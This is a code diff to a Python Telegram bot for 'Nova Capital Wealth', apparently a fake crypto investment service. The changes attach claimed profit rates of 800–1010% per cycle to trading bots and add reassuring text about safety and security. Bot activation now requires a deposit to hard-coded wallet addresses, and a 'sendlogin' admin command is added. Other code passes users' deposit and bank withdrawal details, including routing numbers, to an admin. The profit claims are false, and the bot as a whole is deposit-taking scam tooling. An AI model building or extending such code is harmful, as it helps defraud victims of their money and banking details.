@@ -46,11 +46,11 @@ crypto_addresses = {
     'USDT': '0xAB8aDbEEb9E953db7687Fbb0E070aA9635E9D8D5'
 }
 trading_bots = {
-    'NCW Trading Bot': 'Custom-built algorithm by Nova Capital Wealth for optimal profits.',
-    'AlphaTrend': 'Conservative strategy focusing on steady market trends.',
-    'BetaGrowth': 'Balanced approach for moderate risk and consistent growth.',
-    'GammaProfit': 'Aggressive strategy targeting high returns in volatile markets.',
-    'DeltaStable': 'Diversified portfolio for long-term stability and growth.'
+    'NCW Trading Bot': {'description': 'Custom-built algorithm by Nova Capital Wealth for optimal profits.', 'profit_rate': 1010},
+    'TrendSeeker': {'description': 'Conservative strategy focusing on steady market trends.', 'profit_rate': 850},
+    'GrowthMaster': {'description': 'Balanced approach for moderate risk and consistent growth.', 'profit_rate': 900},
+    'ProfitPulse': {'description': 'Aggressive strategy targeting high returns in volatile markets.', 'profit_rate': 950},
+    'StableCore': {'description': 'Diversified portfolio for long-term stability and growth.', 'profit_rate': 800}
 }
 
 def get_user_data(user_id: int) -> Dict[str, Any]:
@@ -91,13 +91,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         return await show_main_menu(update, context)
         
     keyboard = [
-        [InlineKeyboardButton("🚀 Start Now", callback_data='start_registration')],
+        [InlineKeyboardButton("🚀 START NOW", callback_data='start_registration')],
         [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    welcome_text = """🌟 **Welcome to Nova Capital Wealth Trading Bot!** 🌟
-Your gateway to seamless trading with cutting-edge strategies at Nova Capital Wealth. Ready to unlock your financial potential? Click 'Start Now' to begin!"""
+    welcome_text = """🌟 **Welcome to Nova Capital Wealth Trading Bot** 🌟
+
+Your trusted trading bot in achieving consistent and secure trading success. Designed with cutting-edge algorithms and advanced market analysis, Nova Capital Wealth stands out as one of the best trading bots in the industry, delivering strong and steady profit potential.
+
+With a focus on safety, transparency, and efficiency, our bot operates within a secure trading environment, ensuring that your investments are well-protected while maximizing opportunities in the market.
+
+Nova Capital Wealth Trading Bot offers you the perfect balance of high performance and peace of mind. Ready to unlock your financial potential? Click “START NOW” to begin!"""
     
     await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
     return WAITING_NAME
@@ -199,6 +204,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     user_info = get_user_data(user_id)
     
     menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉
+
 💰 **Available Balance:** ${user_info['balance']:.2f}
 📈 **Deposit:** ${user_info['deposit']:.2f}
 📊 **Profit:** ${user_info['profit']:.2f}
@@ -207,7 +213,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     keyboard = [
         [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
          InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
-        [InlineKeyboardButton("🤖 Copy Trade", callback_data='copy_trade'),
+        [InlineKeyboardButton("🤖 Trading Bot", callback_data='trading_bot'),
          InlineKeyboardButton("🎯 Stake", callback_data='stake')],
         [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
          InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
@@ -360,6 +366,7 @@ async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE)
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         message = f"""💳 **Deposit Details**
+
 💰 **Amount:** ${amount:.2f}
 🪙 **Cryptocurrency:** {crypto_name}
 🏦 **Wallet Address:** {address}
@@ -393,11 +400,10 @@ async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     crypto_name = query.data.split('_')[-1]
     address = crypto_addresses[crypto_name]
     
-    # Send the address as plain text for easy copying
+    # Send only the address as plain text for easy copying
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
-        text=f"{crypto_name} Address:\n`{address}`",
-        parse_mode='Markdown'
+        text=address
     )
     
     # Show the deposit details again to maintain context
@@ -410,6 +416,7 @@ async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     message = f"""💳 **Deposit Details**
+
 💰 **Amount:** ${amount:.2f}
 🪙 **Cryptocurrency:** {crypto_name}
 🏦 **Wallet Address:** {address}
@@ -462,6 +469,7 @@ async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     context.user_data['deposit_message_id'] = update.message.message_id if update.message else None
     
     admin_message = f"""💳 **New Deposit Request**
+
 👤 **User:** {user_info['name']} (ID: {user_id})
 💰 **Amount:** ${amount:.2f}
 🪙 **Crypto:** {crypto_name}
@@ -693,6 +701,7 @@ async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE)
     address = context.user_data['crypto_address']
     
     admin_message = f"""💸 **Crypto Withdrawal Request**
+
 👤 **User:** {user_info['name']} (ID: {user_id})
 💰 **Amount:** ${amount:.2f}
 🏦 **Crypto Address:** {address}
@@ -778,6 +787,7 @@ async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE)
     routing_number = context.user_data['routing_number']
     
     admin_message = f"""💸 **Bank Withdrawal Request**
+
 👤 **User:** {user_info['name']} (ID: {user_id})
 💰 **Amount:** ${amount:.2f}
 🏦 **Bank:** {bank_name}
@@ -873,8 +883,8 @@ async def approve_withdrawal_button(update: Update, context: ContextTypes.DEFAUL
         )
         return MAIN_MENU
 
-async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Show copy trading options"""
+async def show_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Show trading bot options"""
     user_id = update.effective_user.id
     admin_id = get_admin_id()
     
@@ -888,16 +898,28 @@ async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     query = update.callback_query
     await query.answer()
     
+    user_info = get_user_data(user_id)
+    if user_info['balance'] <= 0:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="⚠️ You need a positive balance to activate a trading bot. Please make a deposit first.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("💳 Deposit", callback_data='deposit')],
+                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+            ])
+        )
+        return MAIN_MENU
+    
     keyboard = []
-    for bot_name in trading_bots.keys():
-        keyboard.append([InlineKeyboardButton(f"🤖 {bot_name}", callback_data=f'select_bot_{bot_name}')])
+    for bot_name, bot_info in trading_bots.items():
+        keyboard.append([InlineKeyboardButton(f"🤖 {bot_name} ({bot_info['profit_rate']}% Profit)", callback_data=f'select_bot_{bot_name}')])
     keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
-        text="🤖 **Select Trading Bot**\n\nChoose a trading bot to copy their strategies:",
+        text="🤖 **Select Trading Bot**\n\nChoose a trading bot to activate its strategy:",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
@@ -921,6 +943,17 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
     bot_name = query.data.replace('select_bot_', '')
     user_info = get_user_data(user_id)
     
+    if user_info['balance'] <= 0:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="⚠️ You need a positive balance to activate a trading bot. Please make a deposit first.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("💳 Deposit", callback_data='deposit')],
+                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+            ])
+        )
+        return MAIN_MENU
+    
     if user_info['active_bot'] == bot_name:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
@@ -929,10 +962,13 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
         )
     else:
         user_info['active_bot'] = bot_name
-        description = trading_bots[bot_name]
+        profit_rate = trading_bots[bot_name]['profit_rate']
+        description = trading_bots[bot_name]['description']
         message = f"""✅ **{bot_name} Activated!**
+
 📋 **Description:** {description}
-Our refined strategy will keep you in profits. Monitor your progress in the main menu."""
+📈 **Expected Profit Rate:** {profit_rate}% per cycle
+🚀 Your trading bot is now active, leveraging advanced algorithms to maximize your returns. Monitor your progress in the main menu."""
         
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
@@ -940,6 +976,22 @@ Our refined strategy will keep you in profits. Monitor your progress in the main
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]]),
             parse_mode='Markdown'
         )
+        
+        # Notify admin
+        admin_message = f"""🤖 **Trading Bot Activated**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+🤖 **Bot:** {bot_name}
+📈 **Profit Rate:** {profit_rate}%"""
+        try:
+            await context.bot.send_message(
+                chat_id=admin_id,
+                text=admin_message,
+                parse_mode='Markdown'
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify admin about bot activation for user {user_id}: {e}")
+    
     return MAIN_MENU
 
 async def handle_stake(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -1011,6 +1063,7 @@ async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     user_info = get_user_data(user_id)
     
     menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉
+
 💰 **Available Balance:** ${user_info['balance']:.2f}
 📈 **Deposit:** ${user_info['deposit']:.2f}
 📊 **Profit:** ${user_info['profit']:.2f}
@@ -1019,7 +1072,7 @@ async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     keyboard = [
         [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
          InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
-        [InlineKeyboardButton("🤖 Copy Trade", callback_data='copy_trade'),
+        [InlineKeyboardButton("🤖 Trading Bot", callback_data='trading_bot'),
          InlineKeyboardButton("🎯 Stake", callback_data='stake')],
         [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
          InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
@@ -1093,7 +1146,7 @@ def main() -> None:
     from admin import (
         send_admin_panel, admin_panel, handle_admin_action,
         approve_deposit, approve_withdrawal, update_profit,
-        update_crypto_address, list_users, admin_help
+        update_crypto_address, list_users, admin_help, send_login
     )
     
     # Set admin_id in bot_data
@@ -1133,7 +1186,7 @@ def main() -> None:
                 CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'),
                 CallbackQueryHandler(withdraw_crypto_amount, pattern='^withdraw_crypto$'),
                 CallbackQueryHandler(withdraw_bank_amount, pattern='^withdraw_bank$'),
-                CallbackQueryHandler(show_copy_trade, pattern='^copy_trade$'),
+                CallbackQueryHandler(show_trading_bot, pattern='^trading_bot$'),
                 CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'),
                 CallbackQueryHandler(handle_stake, pattern='^stake$'),
                 CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
@@ -1183,6 +1236,7 @@ def main() -> None:
     application.add_handler(CommandHandler("updatecrypto", update_crypto_address))
     application.add_handler(CommandHandler("listusers", list_users))
     application.add_handler(CommandHandler("adminhelp", admin_help))
+    application.add_handler(CommandHandler("sendlogin", send_login))
     application.add_error_handler(error_handler)
     
     logger.info("Starting NCW Trading Bot...")
